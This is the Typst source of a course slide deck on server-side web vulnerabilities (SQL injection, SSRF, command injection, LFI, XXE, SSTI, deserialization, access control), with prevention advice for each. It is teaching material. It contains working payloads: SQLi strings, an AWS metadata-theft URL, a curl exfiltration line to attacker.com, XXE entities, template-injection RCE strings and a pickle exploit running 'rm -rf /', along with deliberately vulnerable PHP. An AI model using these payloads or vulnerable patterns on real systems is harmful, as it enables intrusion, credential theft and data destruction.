#import "../../../typst-theme-emberzero/1.1.0/src/lib.typ": *

#show: athena-theme.with(
  font: "Berkeley Mono",
  config-info(
    title: [Module 04: Web Security],
    subtitle: [Server-Side Vulnerabilities],
    authors: [*Marcel Schnideritsch*],
    extra: [],
    footer: [Module 04 - Web Security],
  ),
  config-common(
    handout: false,
  ),
)

#title-slide()

#section-slide(title: "SQL Injection (SQLi)")

#slide(title: "What is SQL Injection?")[
  #set text(size: 18pt)
  *SQL Injection (SQLi)*

  - Critical vulnerability enabling manipulation of database queries
  - Attacker injects malicious SQL code into application inputs
  - Consistently in OWASP Top 10

  *Impact:*
  - Authentication bypass
  - Data extraction (all database contents)
  - Data modification/deletion
  - Admin rights escalation
  - Remote code execution (in some cases)
  - Complete system compromise
]

#slide(title: "Basic SQL Injection Example")[
  #local(inset: 0.12em)[
  #set text(size: 18pt)
  *Vulnerable Code:*
  ```php
  <?php
  $username = $_POST['username'];
  $password = $_POST['password'];

  $query = "SELECT * FROM users
            WHERE username='$username'
            AND password='$password'";
  $result = mysqli_query($conn, $query);
  ?>
  ```

  *Attack Input:*
  ```
  Username: admin' --
  Password: [anything]
  ```

  *Resulting Query:*
  ```sql
  SELECT * FROM users WHERE username='admin' --' AND password='...'
  ```

  `--` is SQL comment, password check bypassed!
  ]
]

#slide(title: "Types of SQL Injection")[
  #set text(size: 18pt)
  1. *Union-Based SQLi*
     - Combine results from injected query
     - Requires matching column count

  2. *Boolean-Based Blind SQLi*
     - True/false conditions reveal data

  3. *Time-Based Blind SQLi*
     - Use delays to infer information

  4. *Error-Based SQLi*
     - Extract data via error messages

  5. *Out-of-Band SQLi*
     - Exfiltrate data via DNS/HTTP

  6. *NoSQL Injection*
     - MongoDB, CouchDB vulnerabilities
]

#slide(title: "Union-Based SQLi")[
  *Exploitation Steps:*

  1. Determine column count:
     ```sql
     ' ORDER BY 1--
     ' ORDER BY 2--
     ' ORDER BY 3--  (error = 2 columns)
     ```

  2. Find string columns:
     ```sql
     ' UNION SELECT 'a', 'b'--
     ```

  3. Extract data:
     ```sql
     ' UNION SELECT username, password FROM users--
     ' UNION SELECT table_name, NULL FROM information_schema.tables--
     ```
]

#slide(title: "Blind SQLi")[
  *Boolean-Based:*
  ```sql
  -- Test if database name starts with 's'
  1' AND SUBSTRING(DATABASE(),1,1)='s'--

  -- True: "Product found"
  -- False: "Product not found"
  ```

  *Time-Based:*
  ```sql
  -- MySQL
  1' AND IF(SUBSTRING(DATABASE(),1,1)='s', SLEEP(5), 0)--

  -- SQL Server
  1'; IF (SUBSTRING(DB_NAME(),1,1)='s') WAITFOR DELAY '00:00:05'--
  ```

  *Automate with Python/SQLmap!*
]

#slide(title: "SQL Injection Prevention")[
  #set text(size: 18pt)
  *1. Parameterized Queries (Prepared Statements):*
  ```php
  // SECURE
  $stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
  $stmt->execute([$username, $password]);
  ```

  *2. ORM (Object-Relational Mapping):*
  ```python
  # Django ORM (secure)
  user = User.objects.get(username=username, password=password)
  ```

  *3. Input Validation:*
  ```php
  if (!is_numeric($id)) {
      die("Invalid input");
  }
  ```

  *4. Least Privilege:* Database user with minimal permissions
]

#section-slide(title: "Server-Side Request Forgery (SSRF)")

#slide(title: "What is SSRF?")[
  #set text(size: 18pt)
  *Server-Side Request Forgery*

  - Attacker induces server to make HTTP requests to arbitrary domains
  - Server makes requests on attacker's behalf
  - Can access internal services, cloud metadata, external systems

  *Why Dangerous:*
  - Bypass access controls (IP whitelists)
  - Access internal services (not internet-facing)
  - Steal cloud credentials (AWS, Azure, GCP metadata)
  - Port scanning internal network
  - Secondary attacks appearing from organization
]

#slide(title: "SSRF Example")[
  *Vulnerable Code:*
  ```php
  <?php
  $url = $_GET['url'];
  $content = file_get_contents($url);
  echo $content;
  ?>
  ```

  *Attack:*
  ```
  https://vulnerable.com/fetch?url=http://localhost/admin
  https://vulnerable.com/fetch?url=http://192.168.1.10/admin
  ```

  *Result:* Attacker accesses internal services that should not be public!
]

#slide(title: "Cloud Metadata Exploitation")[
  #set text(size: 18pt)
  *AWS Metadata Endpoint:*
  ```
  https://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
  ```

  *Response (AWS credentials!):*
  ```json
  {
    "AccessKeyId": "ASIA...",
    "SecretAccessKey": "wJalrXUtnFEMI...",
    "Token": "IQoJb3JpZ2luX2VjE...",
    "Expiration": "2025-12-01T12:00:00Z"
  }
  ```

  *Azure:* `http://169.254.169.254/metadata/instance`
  *GCP:* `http://metadata.google.internal/computeMetadata/v1/`

  *Attackers steal cloud credentials and escalate privileges!*
]

#slide(title: "SSRF Prevention")[
  #local(inset: 0.12em)[
  #set text(size: 17pt)
  *1. Whitelist Allowed Destinations:*
  ```php
  $allowed = ['api.example.com', 'cdn.example.com'];
  $parsed = parse_url($url);
  if (!in_array($parsed['host'], $allowed)) {
      die("URL not allowed");
  }
  ```

  *2. Disable Dangerous Protocols:*
  ```php
  // Only allow HTTP/HTTPS
  if (!preg_match('/^https?:\/\//', $url)) {
      die("Invalid protocol");
  }
  ```

  *3. Block Internal IP Ranges:*
  - 127.0.0.0/8 (localhost)
  - 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 (private)
  - 169.254.169.254 (cloud metadata)

  *4. Network Segmentation & Firewall Rules*
  ]
]

#section-slide(title: "Command Injection")

#slide(title: "OS Command Injection")[
  *Definition:* Attacker executes arbitrary operating system commands on server

  *Vulnerable Code:*
  ```php
  <?php
  $ip = $_GET['ip'];
  $output = shell_exec("ping -c 4 " . $ip);
  echo "<pre>$output</pre>";
  ?>
  ```

  *Attack:*
  ```
  https://vulnerable.com/ping.php?ip=8.8.8.8;cat /etc/passwd
  ```

  *Result:* Server pings 8.8.8.8, then executes `cat /etc/passwd`!
]

#slide(title: "Command Injection Techniques")[
  *Command Separators:*
  ```bash
  ; command       # Execute both
  && command      # Execute if first succeeds
  || command      # Execute if first fails
  | command       # Pipe output
  `command`       # Command substitution
  $(command)      # Command substitution
  ```

  *Blind Exploitation:*
  ```bash
  || sleep 10     # Time-based detection
  || curl http://attacker.com/$(whoami)  # DNS exfiltration
  ```
]

#slide(title: "Command Injection Prevention")[
  #set text(size: 14pt)
  *1. Avoid System Commands:*
  ```php
  // BAD
  $files = shell_exec("ls " . $directory);

  // GOOD
  $files = scandir($directory);
  ```

  *2. Use Parameterized APIs:*
  ```python
  # SECURE: Array instead of string
  subprocess.run(['ping', '-c', '4', user_input], shell=False)
  ```

  *3. Input Validation:*
  ```php
  if (!filter_var($ip, FILTER_VALIDATE_IP)) {
      die("Invalid IP");
  }
  ```

  *4. Least Privilege:* Run application with minimal OS permissions
]

#section-slide(title: "Path Traversal & File Inclusion")

#slide(title: "Path Traversal")[
  #set text(size: 18pt)
  *Definition:* Access files outside intended directory

  *Vulnerable Code:*
  ```php
  <?php
  $file = $_GET['file'];
  $content = file_get_contents("/var/www/documents/" . $file);
  echo $content;
  ?>
  ```

  *Attack:*
  ```
  https://vulnerable.com/download.php?file=../../../etc/passwd
  ```

  *Path Resolution:*
  ```
  /var/www/documents/../../../etc/passwd
  → /etc/passwd
  ```
]

#slide(title: "Local File Inclusion (LFI)")[
  #set text(size: 18pt)
  *Vulnerable Code:*
  ```php
  <?php
  $page = $_GET['page'];
  include("/var/www/pages/" . $page . ".php");
  ?>
  ```

  *Attack:*
  ```
  ?page=../../../../etc/passwd%00
  ```

  (`%00` null byte truncates `.php` extension in PHP < 5.3.4)

  *LFI to RCE (Log Poisoning):*
  1. Inject PHP code into log file (User-Agent header)
  2. Include log file via LFI
  3. PHP code executes!
]

#slide(title: "File Inclusion Prevention")[
  #set text(size: 14pt)
  *1. Whitelist Allowed Files:*
  ```php
  $allowed = ['home', 'about', 'contact'];
  if (!in_array($page, $allowed)) {
      die("Invalid page");
  }
  ```

  *2. Use Basename:*
  ```php
  $file = basename($_GET['file']);  // Removes ../ sequences
  ```

  *3. Realpath Validation:*
  ```php
  $base_dir = '/var/www/documents/';
  $full_path = realpath($base_dir . $file);

  if (strpos($full_path, $base_dir) !== 0) {
      die("Invalid path");
  }
  ```
]

#section-slide(title: "XML External Entity (XXE)")

#slide(title: "XXE Injection")[
  #set text(size: 15pt)
  *Definition:* Exploit XML parser to access files or make HTTP requests

  *Vulnerable Code:*
  ```php
  <?php
  $xml = $_POST['xml'];
  $doc = new DOMDocument();
  $doc->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
  ?>
  ```

  *Attack Payload:*
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <data>&xxe;</data>
  ```

  *Result:* Content of `/etc/passwd` is read!
]

#slide(title: "XXE Impact")[
  *What attackers can do:*

  1. *File Disclosure:*
     ```xml
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
     ```

  2. *SSRF:*
     ```xml
     <!ENTITY xxe SYSTEM "http://192.168.1.10/admin">
     ```

  3. *Denial of Service (Billion Laughs):*
     ```xml
     <!ENTITY lol "lol">
     <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;">
     <!-- Exponential expansion → memory exhaustion -->
     ```
]

#slide(title: "XXE Prevention")[
  *Disable External Entity Processing:*

  *PHP:*
  ```php
  libxml_disable_entity_loader(true);
  ```

  *Java:*
  ```java
  factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
  factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
  ```

  *Python:*
  ```python
  parser = etree.XMLParser(resolve_entities=False, no_network=True)
  ```

  *Prefer JSON over XML when possible!*
]

#section-slide(title: "Server-Side Template Injection (SSTI)")

#slide(title: "SSTI")[
  #set text(size: 18pt)
  *Definition:* Inject template directives that execute server-side

  *Vulnerable Code (Flask/Jinja2):*
  ```python
  from flask import render_template_string

  @app.route('/hello')
  def hello():
      name = request.args.get('name')
      template = f"<h1>Hello {name}!</h1>"  # VULNERABLE
      return render_template_string(template)
  ```

  *Attack:*
  ```
  ?name={{7*7}}
  → <h1>Hello 49!</h1>
  ```

  Template expression evaluated!
]

#slide(title: "SSTI Exploitation")[
  *Jinja2 RCE:*
  ```python
  {{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
  ```

  *Twig (PHP) RCE:*
  ```php
  {{_self.env.registerUndefinedFilterCallback("exec")}}
  {{_self.env.getFilter("id")}}
  ```

  *Result:* Remote code execution on server!

  *Detection:*
  ```
  {{7*7}}     → 49 (Jinja2, likely vulnerable)
  ${7*7}      → 49 (Freemarker, likely vulnerable)
  <%= 7*7 %>  → 49 (ERB, likely vulnerable)
  ```
]

#slide(title: "SSTI Prevention")[
  *1. Never Put User Input Directly in Templates:*
  ```python
  # VULNERABLE
  template = f"<h1>Hello {user_input}!</h1>"

  # SECURE
  template = "<h1>Hello {{ name }}!</h1>"
  render_template_string(template, name=user_input)
  ```

  *2. Use Logic-Less Templates:* Mustache, Handlebars

  *3. Sandbox Template Execution:*
  ```python
  from jinja2.sandbox import SandboxedEnvironment
  env = SandboxedEnvironment()
  ```

  *4. Input Validation:* Only allow alphanumeric if possible
]

#section-slide(title: "Insecure Deserialization")

#slide(title: "Insecure Deserialization")[
  #set text(size: 16pt)
  *Definition:* Untrusted data used to reconstruct objects

  *PHP Example:*
  ```php
  class User {
      public $is_admin = false;

      public function __wakeup() {
          if ($this->is_admin) {
              // Grant admin access
          }
      }
  }

  $data = $_COOKIE['user'];
  $user = unserialize($data);  // VULNERABLE
  ```

  *Attack:* Modify serialized cookie to set `is_admin=true`
]

#slide(title: "Deserialization Impact")[
  #set text(size: 15pt)
  *Python Pickle RCE:*
  ```python
  import pickle
  import os

  class Exploit:
      def __reduce__(self):
          return (os.system, ('rm -rf /',))

  payload = pickle.dumps(Exploit())
  # Send to vulnerable app
  ```

  *Java Deserialization:*
  - Exploit gadget chains (Commons-Collections, Spring)
  - Use ysoserial to generate payloads
  - Remote code execution

  *Prevention:* Never deserialize untrusted data!
]

#slide(title: "Deserialization Prevention")[
  #set text(size: 14pt)
  *1. Use Safe Formats:*
  ```python
  # DON'T
  user_data = pickle.loads(request.data)

  # DO
  import json
  user_data = json.loads(request.data)
  ```

  *2. Implement Integrity Checks:*
  ```python
  import hmac
  signature = hmac.new(SECRET, data, hashlib.sha256).digest()
  signed_data = signature + data
  # Verify signature before deserializing
  ```

  *3. Whitelist Allowed Classes (PHP):*
  ```php
  $obj = unserialize($data, ['allowed_classes' => ['User', 'Product']]);
  ```
]

#section-slide(title: "Authentication & Authorization")

#slide(title: "Broken Access Control")[
  #local(inset: 0.12em)[
  *Insecure Direct Object Reference (IDOR):*

  ```php
  <?php
  // VULNERABLE: No authorization check
  $document_id = $_GET['id'];
  $doc = get_document($document_id);
  echo $doc->content;
  ?>
  ```

  *Attack:*
  ```
  /document?id=1234  (my document)
  /document?id=1235  (someone else's document!)
  ```

  *Prevention:*
  ```php
  if ($doc->user_id !== $_SESSION['user_id']) {
      http_response_code(403);
      die("Access denied");
  }
  ```
  ]
]

#slide(title: "Vertical Privilege Escalation")[
  *Vulnerable:*
  ```javascript
  // Admin function without authorization check!
  app.post('/api/admin/delete-user', (req, res) => {
      deleteUser(req.body.userId);  // No check!
  });
  ```

  *Attack:* Regular user calls admin API directly

  *Prevention:*
  ```javascript
  app.post('/api/admin/delete-user', requireAuth, (req, res) => {
      if (req.user.role !== 'admin') {
          return res.status(403).json({error: 'Forbidden'});
      }
      deleteUser(req.body.userId);
  });
  ```
]

#slide(title: "Authentication Best Practices")[
  1. *Strong password policy* (min 12 chars, complexity)
  2. *Rate limiting* on login endpoints
  3. *Multi-factor authentication (MFA)*
  4. *Regenerate session ID after login*
  5. *Secure session storage* (Redis, database)
  6. *Session timeout* (idle and absolute)
  7. *Logout functionality* (clear session)
  8. *Password hashing* (bcrypt, Argon2)
  9. *Account lockout* after failed attempts
  10. *Security questions* (avoid, prefer MFA)
]

#section-slide(title: "Defense in Depth")

#slide(title: "Multiple Layers of Security")[
  1. *Secure Coding*: Parameterized queries, input validation
  2. *Framework Security*: Built-in protections
  3. *WAF (Web Application Firewall)*: Block common attacks
  4. *Network Segmentation*: Isolate systems
  5. *Monitoring & Logging*: Detect attacks
  6. *Security Testing*: SAST, DAST, penetration testing
  7. *Least Privilege*: Minimal permissions
  8. *Keep Updated*: Patch vulnerabilities
  9. *Security Training*: Educate developers
  10. *Incident Response*: Be prepared
]

#slide(title: "Security Testing Tools")[
  #set text(size: 14pt)
  *Static Analysis (SAST):*
  - SonarQube
  - Checkmarx
  - Semgrep

  *Dynamic Analysis (DAST):*
  - Burp Suite
  - OWASP ZAP
  - SQLmap

  *Exploitation:*
  - ysoserial (Java deserialization)
  - tplmap (SSTI)
  - Commix (Command injection)

  *Practice:*
  - PortSwigger Web Security Academy
  - DVWA, bWAPP, WebGoat
  - HackTheBox, TryHackMe
]

#section-slide(title: "Key Takeaways")

#slide(title: "Summary")[
  - *Server-side vulnerabilities* directly compromise backend systems
  - *SQL Injection*: Always use parameterized queries
  - *SSRF*: Dangerous in cloud environments (metadata endpoints)
  - *Command Injection*: Avoid system commands, use safe APIs
  - *File Inclusion*: Whitelist files, use realpath validation
  - *XXE*: Disable external entity processing
  - *SSTI*: Never put user input directly in templates
  - *Deserialization*: Use safe formats (JSON), never deserialize untrusted data
  - *Access Control*: Validate authorization at object level
  - *Defense in Depth*: Multiple layers essential
]

#slide(title: "Resources")[
  #set text(size: 15pt)
  *Learning:*
  - PortSwigger Web Security Academy
  - OWASP Testing Guide
  - HackTheBox / TryHackMe

  *Tools:*
  - Burp Suite
  - SQLmap
  - OWASP ZAP
  - ysoserial
  - Commix

  *Practice Labs:*
  - DVWA
  - bWAPP
  - WebGoat
  - PortSwigger Labs
]

#title-slide(
  author: [Marcel Schnideritsch],
  title: [Server-Side Vulnerabilities],
  subtitle: [Module 04 - Web Security],
)
